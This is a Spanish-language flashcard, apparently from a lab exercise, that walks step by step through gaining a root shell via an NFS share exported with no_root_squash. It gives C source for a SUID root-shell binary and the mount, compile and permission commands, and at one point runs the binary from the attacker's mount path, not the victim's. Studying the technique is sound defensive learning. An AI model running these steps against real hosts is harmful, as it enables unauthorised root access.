**Flashcard: Escalada NFS `no_root_squash` – Paso a paso reproducible**

---

**Objetivo:** Obtener shell root en una máquina víctima a través de un share NFS que tiene `no_root_squash`.

---

### 1. Verificar exports en la víctima

```bash
showmount -e 10.201.123.117
# Output ejemplo:
# /home/ubuntu/sharedfolder *
# /tmp                      *
# /home/backup              *
```

* `no_root_squash` permite que archivos creados con root en la atacante mantengan UID 0 en la víctima.

---

### 2. Montar el share NFS desde la atacante

```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs 10.201.123.117:/tmp /mnt/nfs
cd /mnt/nfs
ls
# Verás: snap.lxd, systemd-private-*, etc.
```

* Montamos `/tmp` de la víctima en nuestra atacante.
* Cualquier archivo creado aquí **puede aparecer como root** en la víctima si tiene propietario root + SUID.

---

### 3. Crear el binario SUID en C

Archivo `nfs.c`:

```c
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

* `setuid(0)` → ejecuta como root.
* `system("/bin/bash")` → lanza shell interactiva.
* `setgid(0)` → grupo root.

---

### 4. Compilar como root en la atacante

```bash
sudo su                # subirse a root en la atacante
gcc nfs.c -o nfs -fno-stack-protector -static
cp nfs /mnt/nfs/       # copiar al share NFS
chown root:root /mnt/nfs/nfs  # importante: propietario root
chmod +s /mnt/nfs/nfs  # activar SUID
ls -l /mnt/nfs/nfs
# Debe mostrar: -rwsr-sr-x 1 root root 769824 ...
```

* **Propietario root** + **SUID activo** = la víctima ejecutará el binario como root.
* `-static` asegura compatibilidad de librerías si la víctima no tiene gcc.

---

### 5. Ejecutar desde la víctima

```bash
/mnt/nfs/nfs
id
# Debe mostrar:
# uid=0(root) gid=0(root), groups=0(root),1001(karen)
```

* Ahora tienes **shell root completo**.
* El usuario original (`karen`) se mantiene en los grupos, pero el UID es 0.

---

### 6. Claves a recordar

1. **SUID solo funciona si propietario = root**.
2. **`no_root_squash`** en NFS permite que root sea respetado en la víctima.
3. Compilar como usuario normal no funciona; la víctima seguirá ejecutando el binario con tu UID normal.
4. Usar `-fno-stack-protector` y `-static` evita protecciones y problemas de librerías dinámicas.
5. Flujo completo:
   `Share NFS escribible con no_root_squash → binario SUID con root → ejecutar en víctima → shell root`.

---
